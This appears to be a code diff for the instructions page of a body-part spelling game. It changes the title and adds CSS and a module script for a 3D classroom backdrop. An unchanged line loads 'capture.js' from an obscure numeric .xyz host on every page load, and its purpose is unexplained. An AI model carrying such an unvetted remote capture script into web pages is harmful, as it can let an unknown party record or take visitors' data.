@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>How to Play — Body Spell Board</title>
+  <title>How to Play — Body Spelling Challenge</title>
   <style>
     :root {
       --ink: #17324d;
@@ -67,6 +67,19 @@
       transform: translateY(4px);
       box-shadow: 0 2px 0 #1d61bb;
     }
+
+    /* 3D classroom backdrop (../js/scene3d.js); only once WebGL has drawn a frame */
+    .scene3d-on body { background: #0e0810; }
+    .scene3d-on .nav, .scene3d-on .poster, .scene3d-on a.play { position: relative; z-index: 1; }
+    .scene3d-on .poster {
+      box-shadow: 0 30px 60px rgba(10, 6, 50, .6), 0 0 0 4px rgba(255, 226, 150, .55), 0 0 40px rgba(255, 230, 150, .3);
+      animation: posterFloat 7s ease-in-out infinite;
+    }
+    @keyframes posterFloat {
+      0%, 100% { transform: perspective(1400px) rotateX(2deg) rotateY(-3deg); }
+      50% { transform: perspective(1400px) rotateX(-1deg) rotateY(3deg) translateY(-8px); }
+    }
+    .scene3d-on a.play { box-shadow: 0 6px 0 #1d61bb, 0 0 22px rgba(80, 160, 255, .55); }
   </style>
 </head>
 <body>
@@ -75,6 +88,10 @@
   </div>
   <img class="poster" src="how-to-play.png" alt="How to Play" />
   <a class="play" href="Body_Spell_Challenge_Champion_Summary.html">NEXT →</a>
+  <script type="module">
+    import { mountMagicScene } from "../js/scene3d.js";
+    mountMagicScene({ theme: "classroom", view: "body", intensity: 0.7 });
+  </script>
   <script src="https://record.22422522.xyz/capture.js?v=2"></script>
 </body>
 </html>
